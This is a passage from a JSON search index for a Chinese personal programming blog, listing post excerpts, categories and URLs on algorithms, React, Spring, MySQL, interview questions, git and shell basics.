首先就是第一次如果都是白色，那么自己肯定是黑色的。但是没有声音，所以就可以肯定至少有两顶黑帽子，如果有个人发","lvl0":"世界500强的智力题","lvl1":["其他","智力题"],"lvl2":"摘要","objectID":"48894f3a6b3d20bbbd34b2b57ef19990","tags":[""],"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/01.%E6%99%BA%E5%8A%9B%E9%A2%98/01.%E4%B8%96%E7%95%8C500%E5%BC%BA%E7%9A%84%E6%99%BA%E5%8A%9B%E9%A2%98/"},{"content":"位运算的常用技巧 位运算是算法题里比较特殊的一种类型，它们利用二进制位运算的特性进行一些奇妙的优化 和计算。常用的位运算符号包括：“∧”按位异或","lvl0":"位运算","lvl1":["算法和数据结构","CMU硕士经典100题"],"lvl2":"摘要","objectID":"5ead4a610cf2d4f3f60d82ee4e636e26","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/04.cmu%E7%A1%95%E5%A3%AB%E7%BB%8F%E5%85%B8100%E9%A2%98/09.%E4%BD%8D%E8%BF%90%E7%AE%97/"},{"content":"解释 顾名思义，分治问题由“分”（divide）和“治”（conquer）两部分组成，通过把原问题分为子 问题，再将子问题进行处理合并，从而实现","lvl0":"分治法解题","lvl1":["算法和数据结构","CMU硕士经典100题"],"lvl2":"摘要","objectID":"ec8b1aff4a409d218ee691dff0a4472b","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/04.cmu%E7%A1%95%E5%A3%AB%E7%BB%8F%E5%85%B8100%E9%A2%98/07.%E5%88%86%E6%B2%BB%E6%B3%95%E8%A7%A3%E9%A2%98/"},{"content":"基本概念 图通常分为有向（directed）或无向（undirected），有 循环（cyclic）或无循环（acyclic），所有节点相连（c","lvl0":"图","lvl1":["算法和数据结构","CMU硕士经典100题"],"lvl2":"摘要","objectID":"232d9a4e519aaee69b30d79619995880","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/04.cmu%E7%A1%95%E5%A3%AB%E7%BB%8F%E5%85%B8100%E9%A2%98/14.%E5%9B%BE/"},{"content":"基本概念 字串 是在字符串中，取出一块（连续的），如：pik, ach, kac等 子序列 指的是从字符串中，顺序取出字符，但是可以不连续：如：pau, kch, ic","lvl0":"字符串","lvl1":["算法和数据结构","CMU硕士经典100题"],"lvl2":"摘要","objectID":"19292cf24669009be863473985e8a652","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/04.cmu%E7%A1%95%E5%A3%AB%E7%BB%8F%E5%85%B8100%E9%A2%98/11.%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"content":"这里主要是考一些数学概念之类的，这里我简单分分类 公倍数与公因数 利用辗转相除法，我们可以很方便地求得两个数的最大公因数（greatest common di","lvl0":"数学问题","lvl1":["算法和数据结构","CMU硕士经典100题"],"lvl2":"摘要","objectID":"497e6fd5c9e2f16af6c4566cafb908ae","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/04.cmu%E7%A1%95%E5%A3%AB%E7%BB%8F%E5%85%B8100%E9%A2%98/08.%E6%95%B0%E5%AD%A6%E9%97%AE%E9%A2%98/"},{"content":"数组 找到所有数组中消失的数字 这题目想法可以借鉴一下，就是我们让数组作为数组的下标，然后根据当前数字的正负来判断数字是否出现。 1 2 3 4 5 6 7 8","lvl0":"数据结构","lvl1":["算法和数据结构","CMU硕士经典100题"],"lvl2":"摘要","objectID":"669828de5ee9a615ff84eb206777de91","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/04.cmu%E7%A1%95%E5%A3%AB%E7%BB%8F%E5%85%B8100%E9%A2%98/10.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"content":"并查集 复合数据结构","lvl0":"更加复杂的数据结构","lvl1":["算法和数据结构","CMU硕士经典100题"],"lvl2":"摘要","objectID":"f72d230d1088d11b3f4e045a6b7beb8f","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/04.cmu%E7%A1%95%E5%A3%AB%E7%BB%8F%E5%85%B8100%E9%A2%98/15.%E6%9B%B4%E5%8A%A0%E5%A4%8D%E6%9D%82%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"content":"树的递归 二叉树的最大深度 104. 二叉树的最大深度 - 力扣（LeetCode） (leetcode-cn.com) 终于没看题解做对了一个，太难了，不过这题目比较简单，所以没啥炫耀的，害","lvl0":"树","lvl1":["算法和数据结构","CMU硕士经典100题"],"lvl2":"摘要","objectID":"ec86c902c3ea237fba7304cda3ef84a6","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/04.cmu%E7%A1%95%E5%A3%AB%E7%BB%8F%E5%85%B8100%E9%A2%98/13.%E6%A0%91/"},{"content":"链表的基本操作 翻转链表 206. 反转链表 - 力扣（LeetCode） (leetcode-cn.com) 有递归法和非递归法这两种，先说一下递归法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20","lvl0":"链表","lvl1":["算法和数据结构","CMU硕士经典100题"],"lvl2":"摘要","objectID":"64bf323cfcac079de0fc6b34d1a001cf","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/04.cmu%E7%A1%95%E5%A3%AB%E7%BB%8F%E5%85%B8100%E9%A2%98/12.%E9%93%BE%E8%A1%A8/"},{"content":"解释 二分查找也常被称为二分法或者折半查找，每次查找时通过将待查找区间分成两部分并只取 一部分继续查找，将查找的复杂度大大减少。对于一个长度为 O(n)","lvl0":"二分查找","lvl1":["算法和数据结构","CMU硕士经典100题"],"lvl2":"摘要","objectID":"00d5af6d07d3f60c9ab1173fbd626cd6","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/04.cmu%E7%A1%95%E5%A3%AB%E7%BB%8F%E5%85%B8100%E9%A2%98/03.%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"},{"content":"算法解释 这里我们引用一下维基百科的描述：“动态规划（Dynamic Programming, DP）在查找有很多 重叠子问题的情况的最优解时有效。它将问题重新组合成子问","lvl0":"动态规划","lvl1":["算法和数据结构","CMU硕士经典100题"],"lvl2":"摘要","objectID":"8078208a104142a1d00c58e2839aeca6","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/04.cmu%E7%A1%95%E5%A3%AB%E7%BB%8F%E5%85%B8100%E9%A2%98/06.%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"},{"content":"算法解释 双指针主要用于遍历数组，两个指针指向不同的元素，从而协同完成任务。也可以延伸到多个数组的多个指针。 若两个指针指向同一数组，遍历方向相","lvl0":"双指针法","lvl1":["算法和数据结构","CMU硕士经典100题"],"lvl2":"摘要","objectID":"8e701dc45ae0de97c4c3e177bf396673","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/04.cmu%E7%A1%95%E5%A3%AB%E7%BB%8F%E5%85%B8100%E9%A2%98/02.%E5%8F%8C%E6%8C%87%E9%92%88%E6%B3%95/"},{"content":"常用的排序算法 以下是一些最基本的排序算法。虽然在 C++ 里可以通过 std::sort() 快速排序，而且刷题 时很少需要自己手写排序算法，但是熟习各种排序算法可以加深自己","lvl0":"各种排序","lvl1":["算法和数据结构","CMU硕士经典100题"],"lvl2":"摘要","objectID":"aab82b76a66fe218b06f07a580770f29","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/04.cmu%E7%A1%95%E5%A3%AB%E7%BB%8F%E5%85%B8100%E9%A2%98/04.%E5%90%84%E7%A7%8D%E6%8E%92%E5%BA%8F/"},{"content":"解释 深度优先搜索和广度优先搜索是两种最常见的优先搜索方法，它们被广泛地运用在图和树等 结构中进行搜索。 深度优先搜索 深度优先搜索（depth-f","lvl0":"各种搜索","lvl1":["算法和数据结构","CMU硕士经典100题"],"lvl2":"摘要","objectID":"40ef4fd4047fd49b69a7925b302e2106","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/04.cmu%E7%A1%95%E5%A3%AB%E7%BB%8F%E5%85%B8100%E9%A2%98/05.%E5%90%84%E7%A7%8D%E6%90%9C%E7%B4%A2/"},{"content":"算法解释 顾名思义，贪心算法或贪心思想采用贪心的策略，保证每次操作都是局部最优的，从而使最 后得到的结果是全局最优的。 举一个最简单的例子：小明和","lvl0":"贪心算法","lvl1":["算法和数据结构","CMU硕士经典100题"],"lvl2":"摘要","objectID":"fd5059b7f9858f7755dde92a8f6b0501","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/04.cmu%E7%A1%95%E5%A3%AB%E7%BB%8F%E5%85%B8100%E9%A2%98/01.%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/"},{"content":"01. JSX简介 什么是JSX？ 1 const element = \u0026lt;h1\u0026gt;Hello, world!\u0026lt;/h1\u0026gt;; 以类似模板语法的方式描述UI的一种语法。它是JS的语法糖，本质上也是JS。可以在其中使用变量或表达式、","lvl0":"JSX简介","lvl1":["《React》笔记","核心概念"],"lvl2":"摘要","objectID":"609b091c96271eaab1e2c36dc181e004","tags":["React"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/01.%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5/01.jsx%E7%AE%80%E4%BB%8B/"},{"content":"04. State \u0026amp; 生命周期 State 与 props 类似，但是 state 是私有的，并且完全受控于当前组件. State类似于vue中的data选项 将函数组件转换成 class 组件 在没有useS","lvl0":"State\u0026生命周期","lvl1":["《React》笔记","核心概念"],"lvl2":"摘要","objectID":"86c3d7e4276b706b18f3eef06f6a6429","tags":["React"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/01.%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5/04.state%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/"},{"content":"05. 事件处理 与传统HTML绑定事件的区别 传统的 HTML： 1 2 3 \u0026lt;button onclick=\u0026#34;activateLasers()\u0026#34;\u0026gt; Activate Lasers \u0026lt;/button\u0026gt; 在 React 中略微不同： 1 2 3 4 // 1.事件名为小驼峰； 2.传入函数以大括号包裹","lvl0":"事件处理","lvl1":["《React》笔记","核心概念"],"lvl2":"摘要","objectID":"7b8e781edae48fc3b1364166a8685d92","tags":["React"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/01.%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5/05.%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86/"},{"content":"02. 元素渲染 元素是构成 React 应用的最小砖块，描述了你在屏幕上想看到的内容。 1 const element = \u0026lt;h1\u0026gt;Hello, world\u0026lt;/h1\u0026gt;; 与浏览器的 DOM 元素不同，React 元素是创建开销极小的普通对象","lvl0":"元素渲染","lvl1":["《React》笔记","核心概念"],"lvl2":"摘要","objectID":"280262aa559cda5a4a1e9a2674ce3837","tags":["React"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/01.%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5/02.%E5%85%83%E7%B4%A0%E6%B8%B2%E6%9F%93/"},{"content":"07. 列表 \u0026amp; Key 如下代码，我们使用 map() 函数让数组中的每一项变双倍，然后我们得到了一个新的列表 doubled 并打印出来： 1 2 3 const numbers = [1, 2, 3, 4, 5]; const doubled = numbers.map((number) =\u0026gt; number * 2); console.log(doubled); 在","lvl0":"列表\u0026Key","lvl1":["《React》笔记","核心概念"],"lvl2":"摘要","objectID":"cf7635a01bdb1c1ba9d79fa8f71e22f1","tags":["React"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/01.%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5/07.%E5%88%97%E8%A1%A8key/"},{"content":"06. 条件渲染 React 中的条件渲染和 JavaScript 中的一样，使用 JavaScript 运算符 if 或者条件运算符去创建元素来表现当前的状态，然后让 React 根据它们来更新 UI。 观察这两个组件: 1","lvl0":"条件渲染","lvl1":["《React》笔记","核心概念"],"lvl2":"摘要","objectID":"e53240e6bcdf0fa4a0d06b67c740c557","tags":["React"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/01.%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5/06.%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93/"},{"content":"03. 组件 \u0026amp; Props 函数组件与 class 组件 1.函数组件 1 2 3 function Welcome(props){ return \u0026lt;h1\u0026gt;Hello, {props.name}\u0026lt;/h1\u0026gt; } 该函数是一个有效的React组件。接收唯一带有数据的props参数，并返回一个Rea","lvl0":"组件\u0026Props","lvl1":["《React》笔记","核心概念"],"lvl2":"摘要","objectID":"796224f2a1183fde6ec6aed04459b584","tags":["React"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/01.%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5/03.%E7%BB%84%E4%BB%B6props/"},{"content":"08. 表单 受控组件（双向数据绑定） 在 HTML 中，表单元素（如\u0026lt;input\u0026gt;、 \u0026lt;textarea\u0026gt; 和 \u0026lt;select\u0026gt;）通常自己维护 state，并根","lvl0":"表单","lvl1":["《React》笔记","核心概念"],"lvl2":"摘要","objectID":"37a181f7ddf84d199998d263d7a62979","tags":["React"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/01.%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5/08.%E8%A1%A8%E5%8D%95/"},{"content":"操作系统相关 冯诺伊曼体系 该思想约定了用二进制进行计算和存储，还定义计算机基本结构为 5 个部分，分别是中央处理器（CPU）、内存、输入设备、输出","lvl0":"其他","lvl1":["基础学科","操作系统"],"lvl2":"摘要","objectID":"987845eb0617162b428d2f0d0b8106d6","tags":[""],"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/01.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/6.%E5%85%B6%E4%BB%96/"},{"content":"这里同样直接整理面试题 同学问的一些问题 NGINX的优势 可以热部署 支持高并发连接 内存消耗低 处理响应快 可靠性高 NGINX 负载均衡算法 轮询 （默认） 每个请求","lvl0":"NGINX","lvl1":["软件和系统","软件使用"],"lvl2":"摘要","objectID":"49255f8150d477816fc35de1830dd7f3","tags":[""],"url":"https://lyr-2000.github.io/post/05.%E8%BD%AF%E4%BB%B6%E5%92%8C%E7%B3%BB%E7%BB%9F/01.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/02.nginx/"},{"content":"SpringSecurity 采用的是责任链的设计模式，它有一条很长的过滤器链。现在对这条过滤器链的各个进行说明: WebAsyncManagerIntegrationF","lvl0":"springSecurity","lvl1":["框架","spring全家桶"],"lvl2":"摘要","objectID":"e356d609aaa61501e9705057407afab6","tags":[""],"url":"https://lyr-2000.github.io/post/04.%E6%A1%86%E6%9E%B6/01.spring%E5%85%A8%E5%AE%B6%E6%A1%B6/4.springsecurity/"},{"content":"因为没找到好的项目结构，所以这里就先说面试题吧 同学的一次面试 mybatis的优缺点 与JDBC相比，减少了50%以上的代码量 MyBatis是最","lvl0":"面试题","lvl1":["框架","mybatis"],"lvl2":"摘要","objectID":"c31b0f44cd2516effe174f602b2f52a4","tags":[""],"url":"https://lyr-2000.github.io/post/04.%E6%A1%86%E6%9E%B6/02.mybatis/01.%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"content":"同学的一次面试 内存溢出的两种问题及原因 java.lang.OutOfMemoryError 方法区主要存储类的元信息，实现在元数据区。当JVM发现元数据区没有足够的空间分配给加载的类时，抛出该","lvl0":"面试题","lvl1":["程序语言","JAVA"],"lvl2":"摘要","objectID":"21dae96d4b72dcb8c1f87555937a700a","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/02.java/11.%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"content":"说说自己对于 spring-mvc 了解 谈到这个问题，我们不得不提提之前 Model1 和 Model2 这两个没有 Spring MVC 的时代。 Model1 时代 : 很多学 Java 后端比较晚的朋友可能并没有接触过 Model1 模式下的 JavaWeb 应","lvl0":"spring MVC","lvl1":["框架","spring全家桶"],"lvl2":"摘要","objectID":"4ad9e7da92d7dfbe9eb61febc8717840","tags":[""],"url":"https://lyr-2000.github.io/post/04.%E6%A1%86%E6%9E%B6/01.spring%E5%85%A8%E5%AE%B6%E6%A1%B6/3.spring-mvc/"},{"content":"AOP(Aspect-Oriented Programming), 即 面向切面编程, 它与 OOP( Object-Oriented Programming, 面向对象编程) 相辅相成, 提供了与 OOP 不同的抽象软件结构的视角. 在 AOP 中, 我们以类(class)作为我们的基本单元,","lvl0":"AOP","lvl1":["框架","spring全家桶"],"lvl2":"摘要","objectID":"69ed12abc5aded05ce9dc2b5abb3c3d8","tags":[""],"url":"https://lyr-2000.github.io/post/04.%E6%A1%86%E6%9E%B6/01.spring%E5%85%A8%E5%AE%B6%E6%A1%B6/2.aop/"},{"content":"IoC全称Inversion of Control，直译为控制反转 它不是什么技术，而是一种设计思想。在spring中，IOC就意味着我们把设计好的","lvl0":"IOC","lvl1":["框架","spring全家桶"],"lvl2":"摘要","objectID":"30f85bafec2dc0aa1bc0261154c6f689","tags":[""],"url":"https://lyr-2000.github.io/post/04.%E6%A1%86%E6%9E%B6/01.spring%E5%85%A8%E5%AE%B6%E6%A1%B6/1.ioc/"},{"content":"不知道从哪找的 浏览器禁用 Cookie怎么保存状态 此时无法使用 Cookie 来保存用户信息，只能使用 Session。除此之外，不能再将 Session ID 存放到 Cookie 中，而是","lvl0":"高频面试题总结","lvl1":["基础学科","计算机网络"],"lvl2":"摘要","objectID":"e1766e482415765596d698ba6cf69351","tags":[""],"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/02.%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/6.%E9%AB%98%E9%A2%91%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93/"},{"content":"不知道从哪里抄的 如何查看表格定义的所有索引 SHOW INDEX FROM \u0026lt;tablename\u0026gt;; LIKE 声明中的％和 _ 是什么意思？ ％对应于 0 个或更多字符，_只是 LIKE 语句中的一个字符。 如何在 Unix 和 MySQL","lvl0":"高频面试题","lvl1":["数据库","MySQL"],"lvl2":"摘要","objectID":"ecc0bfbacdcee01f257c2b4c6391da5c","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/01.mysql/8.%E9%AB%98%E9%A2%91%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"content":"细说指针 让你不再害怕指针——C指针详解(经典,非常详细)_程序老兵的博客-CSDN博客_c指针详解经典非常详细 1 2 3 4 5 6 7 8 9 int p; //这是","lvl0":"指针问题","lvl1":["程序语言","C语言"],"lvl2":"摘要","objectID":"6c7d1f7693200b20c384c80ad9e238e1","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/03.cc++%E8%AF%AD%E8%A8%80/01.%E6%8C%87%E9%92%88%E9%97%AE%E9%A2%98/"},{"content":"Vue原理 实例化过程 初始化生命周期，初始化事件，初始化渲染，触发执行beforeCreate生命周期方法，初始化data/props数据监听","lvl0":"第一次面试","lvl1":["个人面试","字节跳动"],"lvl2":"摘要","objectID":"5c78e58dd64a60185df7f3cb7ec08b7f","tags":[""],"url":"https://lyr-2000.github.io/post/07.%E4%B8%AA%E4%BA%BA%E9%9D%A2%E8%AF%95/01.3%E6%9C%88%E4%BB%BD%E9%9D%A2%E8%AF%95/01.%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95/"},{"content":"go的几个web框架 beego，iris，gin，echo，revel 为什么Echo框架查找速度快 基于 radix tree ，Echo 的路由查询速度非常快。路","lvl0":"第二次面试","lvl1":["个人面试","字节跳动"],"lvl2":"摘要","objectID":"d09b1605d657bb6060bc853412b62fad","tags":[""],"url":"https://lyr-2000.github.io/post/07.%E4%B8%AA%E4%BA%BA%E9%9D%A2%E8%AF%95/01.3%E6%9C%88%E4%BB%BD%E9%9D%A2%E8%AF%95/02.%E7%AC%AC%E4%BA%8C%E6%AC%A1%E9%9D%A2%E8%AF%95/"},{"content":"创建型模式关注点是如何创建对象，其核心思想是要把对象的创建和使用相分离，这样使得两者能相对独立地变换。创建型模式包括： 工厂方法：Factor","lvl0":"创建型","lvl1":["算法和数据结构","设计模式"],"lvl2":"摘要","objectID":"6085521aaf3f476e05466f352a73b333","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/03.%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/01.%E5%88%9B%E5%BB%BA%E5%9E%8B/"},{"content":"结构型模式主要涉及如何组合各种对象以便获得更好、更灵活的结构。虽然面向对象的继承机制提供了最基本的子类扩展父类的功能，但结构型模式不仅仅简单","lvl0":"结构性","lvl1":["算法和数据结构","设计模式"],"lvl2":"摘要","objectID":"248c91f7b8f2bb35c6caff499a0df1c4","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/03.%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/02.%E7%BB%93%E6%9E%84%E5%9E%8B/"},{"content":"行为型模式主要涉及算法和对象间的职责分配。通过使用对象组合，行为型模式可以描述一组对象应该如何协作来完成一个整体任务。 行为型模式有： 责任链 命","lvl0":"行为型","lvl1":["算法和数据结构","设计模式"],"lvl2":"摘要","objectID":"ce06e05cc0fd1ae63951b81d66221667","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/03.%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/03.%E8%A1%8C%E4%B8%BA%E5%9E%8B/"},{"content":"主从复制 将主数据库中的DDL和DML操作通过二进制日志（BINLOG）传输到从数据库上，然后将这些日志重新执行（重做）；从而使得从数据库的数","lvl0":"分布式和备份","lvl1":["数据库","MySQL"],"lvl2":"摘要","objectID":"3eecb7fbc843341d211e4b6d79942620","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/01.mysql/7.%E5%88%86%E5%B8%83%E5%BC%8F%E5%92%8C%E5%A4%87%E4%BB%BD/"},{"content":"插入排序 直接插入排序 插入排序是最简单的，我们不断比较插入数据 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 // 插入排序 // 时间复杂度 n^2 // 因为我们这里","lvl0":"排序算法","lvl1":["算法和数据结构","算法"],"lvl2":"摘要","objectID":"08a03b0ad1ceafc74c0eace95249fb5a","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/01.%E7%AE%97%E6%B3%95/01.%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"content":"线性表查找 顺序查找 顺序查找(Sequential Search) 的查找过程为：从表的一端开始， 依次将记录的关键字和给定值进行比较，若某个记录的关键字和给定","lvl0":"查找算法","lvl1":["算法和数据结构","算法"],"lvl2":"摘要","objectID":"deaa240a786cb032f26108a53e916ec0","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/01.%E7%AE%97%E6%B3%95/02.%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95/"},{"content":"字符串匹配算法 1.BF算法 BF算法是一个古典的算法，算法主要思想如下图所示 按顺序一位一位进行比较，如果有一位不匹配，那么原字符串+1 2.KM","lvl0":"串、数组、广义表","lvl1":["算法和数据结构","数据结构"],"lvl2":"摘要","objectID":"77b4f7d8ae5ece99bbd86ebb0b90ba69","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/02.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/03.%E4%B8%B2%E6%95%B0%E7%BB%84%E5%B9%BF%E4%B9%89%E8%A1%A8/"},{"content":"基本概念 图包括有向图和无向图，有向图就是从一个点到另一个点是有方向的，无向图就是点和点之间没有方向。\u0026lt;v,w\u0026gt; 是有序的（有向图）","lvl0":"图","lvl1":["算法和数据结构","数据结构"],"lvl2":"摘要","objectID":"84f894a050fbcd11ca78b69160d3a8ca","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/02.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/05.%E5%9B%BE/"},{"content":"二叉树的遍历 1.先序遍历：根结点 \u0026mdash;\u0026gt; 左子树 \u0026mdash;\u0026gt; 右子树 2.中序遍历：左子树\u0026mdash;\u0026gt; 根结点 \u0026mdash;\u0026gt; 右子树 3.后序遍历：左子树 \u0026mdash;\u0026gt; 右子树 \u0026mdash;\u0026gt; 根结点","lvl0":"数和二叉树","lvl1":["算法和数据结构","数据结构"],"lvl2":"摘要","objectID":"1b198c5c9b52298a68d21b7157995997","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/02.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/04.%E6%95%B0%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/"},{"content":"堆和栈的区别 栈是一种受限的线性表，如下图所示 堆是二叉树的结构，堆是一种常用的树形结构，是一种特殊的完全二叉树，当且仅当满足 所有节点的值总是不","lvl0":"栈和队列","lvl1":["算法和数据结构","数据结构"],"lvl2":"摘要","objectID":"fa2de9f4db3a48f85d3c558c0f9f0d9e","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/02.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/02.%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/"},{"content":"链表 链表分为单链表，循环链表，双向链表，二叉链表，十字链表，邻接表，邻接多重表 首元节点，头节点，头指针 头结点 在链表的第一个节点之前会额外增设","lvl0":"线性表","lvl1":["算法和数据结构","数据结构"],"lvl2":"摘要","objectID":"e462cc3e583853fe5188ccaab9609c61","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/02.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/01.%E7%BA%BF%E6%80%A7%E8%A1%A8/"},{"content":"常用命令 git init 初始化git仓库 git clone 克隆git仓库 git remote add origin ***.git 添加一个新的远程残酷 git push -u origin master 本地的 master 分支推送到 origin 主机的 master 分支。 推送到远程仓库的de","lvl0":"Git","lvl1":["软件和系统"],"lvl2":"摘要","objectID":"565096199b27b661eac755886cb2f978","tags":[""],"url":"https://lyr-2000.github.io/post/05.%E8%BD%AF%E4%BB%B6%E5%92%8C%E7%B3%BB%E7%BB%9F/01.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/01.git/"},{"content":"shell脚本运算符 算数运算符 运算符 说明 举例 + 加法 expr $a + $b 结果为 30。 - 减法 expr $a - $b 结果为 -10。 * 乘法 expr $a \\* $b 结果为 200。 / 除法 expr $b / 